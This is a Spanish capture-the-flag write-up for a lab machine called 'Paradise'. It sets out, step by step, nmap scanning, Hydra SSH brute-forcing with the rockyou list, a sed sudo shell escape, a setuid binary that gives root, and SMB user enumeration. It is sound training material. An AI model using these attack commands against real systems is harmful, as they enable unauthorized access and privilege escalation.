# Paradise

**Nivel:** Fácil

**Autor:** [kaikoperez](https://kiket25.github.io/HackStry/)

------------------
## Escaneo 

Relizamos un escaneo general con **nmap** en la IP de la máquina víctima para identificar los puertos abiertos. 

```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
----------------------------------------------------------------
PORT   STATE SERVICE REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64

```

A continuación, utilizamos los scripts predeterminados de **nmap** para recopilar más información sobre los puertos identificados:

```shell
nmap -sCV -p22,80,139,445 172.17.0.2
-----------------------------------------------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 a1:bc:79:1a:34:68:43:d5:f4:d8:65:76:4e:b4:6d:b1 (DSA)
|   2048 38:68:b6:3b:a3:b2:c9:39:a3:d5:f9:97:a9:5f:b3:ab (RSA)
|   256 d2:e2:87:58:d0:20:9b:d3:fe:f8:79:e3:23:4b:df:ee (ECDSA)
|_  256 b7:38:8d:32:93:ec:4f:11:17:9d:86:3c:df:53:67:9a (ED25519)
80/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Andys's House
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: PARADISE)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: PARADISE)
Service Info: Host: UBUNTU; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: 28d0eccd0097
|   NetBIOS computer name: UBUNTU\x00
|   Domain name: \x00
|   FQDN: 28d0eccd0097
|_  System time: 2025-01-04T13:21:47+00:00
| smb2-time: 
|   date: 2025-01-04T13:21:46
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
```

Evidenciamos varios servicios habilitados y datos relevantes iniciamos accediendo al sitio web para inspeccionar su contenido:

![image](https://github.com/user-attachments/assets/beff7dc2-fbd9-49b4-b5b6-b979b9f254e6)

![image](https://github.com/user-attachments/assets/7b1dc539-1cd9-47ce-9b08-dfcea77f234a)

![image](https://github.com/user-attachments/assets/cf93d3f3-65bf-4eef-809a-3f4f01c926cc)

Evidenciamos el en código fuente de la página **galery.html** un comentario que podria ser información relevante.

![image](https://github.com/user-attachments/assets/bbeec942-613b-417e-a61d-46e60cd82bb2)

Utilizando el recurso [CyberChef](https://gchq.github.io/CyberChef/) con el módulo **Magic** encontramos un dato que podria ser información relevante.

![image](https://github.com/user-attachments/assets/6f03695d-8972-42da-8ee5-534ab0547e33)

Luego de verificar el valor obtenido en la url del sitio web evidenciamos que corresponde a un directorio que contiene el fichero **mensaje_para_lucas.txt**

![image](https://github.com/user-attachments/assets/871bc2a6-d90a-43da-87fe-390a0cc49aad)

En este punto evidenciamos un potencial usuario **lucas** y un potencial ataque de acuerdo con la pista obtenida **fuerza bruta**

--------------
## Explotación

Utilizando **Hydra** lanzamos un ataque de fuerza bruta al servicio **SSH**:

```shell
hydra -l lucas -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh

```
Hemos encontrado un usuario válido y tenemos acceso al máquina víctima:

```shell
ssh lucas@172.17.0.2 
------------------------------
$
```

------------------------------
## Escalando privilegios

Verificamos si es posible ejecutar algún fichero como **root** con **sudo -l**:

```shell
sudo -l
---------------------------------------------------------
User lucas may run the following commands on 28d0eccd0097:
    (andy) NOPASSWD: /bin/sed
```

Observamos que podemos ejecutar **sed** como el usuario **andy** revisamos la documentación de [GTFOBins for sed](https://gtfobins.github.io/gtfobins/sed/#sudo)

```shell
sudo -u andy sed -n '1e exec bash 1>&0' /etc/hosts
```

En este punto, considerando que desconocemos el password del usuario **andy** procedemos a verificar los ficheros con el [**setuid**](https://es.wikipedia.org/wiki/Setuid) habilitado

```shell
find / -perm -4000 -type f 2>/dev/null
------------------------------------------------
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/local/bin/privileged_exec
/usr/local/bin/backup.sh
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/bin/su
/bin/mount
/bin/ping6
/bin/ping
/bin/umount
```

Evidenciamos el fichero **privileged_exec** y procedemos a ejecutarlo:

```shell
/usr/local/bin/privileged_exec
------------------------------
Running with effective UID: 0
```

Finalmente hemos podido obtener acceso como usuario **root**:

```shell
whoami
----------------
root
```

------------------------------
## Notas adicionales

En consideración al adagio popular "Todos los caminos conducen a roma", que significa que hay varias formas de llegar al mismo resultado, a partir del escaneo de puertos y servicios también es posible realizar enumeración al **SMB**:

```shell
enum4linux 172.17.0.2
----------------
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                           
                                                                                                                                      
S-1-22-1-1000 Unix User\andy (Local User)                                                                                             
S-1-22-1-1001 Unix User\lucas (Local User)
```
Y podemos observar que existen en la máquina víctima los usuarios **andy** y **lucas** y lanzar a continuación el ataque de fuerza bruta con **hydra**
